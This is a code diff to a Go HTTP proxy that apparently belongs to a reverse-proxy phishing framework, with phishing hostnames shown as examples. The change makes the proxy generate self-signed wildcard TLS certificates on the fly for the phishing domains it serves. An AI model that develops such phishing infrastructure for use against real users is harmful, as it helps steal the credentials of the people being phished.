@@ -3798,10 +3798,33 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				// hostname is the phish hostname (e.g. owa.fpcsorp.ca)
 				cert := p.crt_db.getWildcardCertificate(hostname)
 				if cert != nil {
+					log.Debug("[TLS] serving wildcard cert for %s", hostname)
 					return &tls.Config{
 						Certificates: []tls.Certificate{*cert},
 					}, nil
 				}
+				// Wildcard cert not found - generate one on-the-fly
+				log.Debug("[TLS] wildcard cert not found for %s, generating...", hostname)
+				// Extract base domain from hostname (e.g., owa.fpcsorp.ca -> fpcsorp.ca)
+				parts := strings.SplitN(hostname, ".", 2)
+				if len(parts) == 2 {
+					wildcardDomain := "*." + parts[1]
+					err := p.crt_db.setSelfSignedWildcardSync([]string{wildcardDomain})
+					if err != nil {
+						log.Error("[TLS] failed to generate wildcard cert: %v", err)
+					} else {
+						cert = p.crt_db.getWildcardCertificate(hostname)
+						if cert != nil {
+							log.Debug("[TLS] generated and serving wildcard cert for %s", hostname)
+							return &tls.Config{
+								Certificates: []tls.Certificate{*cert},
+							}, nil
+						}
+					}
+				}
+				// If we still don't have a cert, return error instead of hanging on certmagic
+				log.Error("[TLS] no wildcard cert available for %s", hostname)
+				return nil, fmt.Errorf("no wildcard certificate for %s", hostname)
 			}
 
 			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
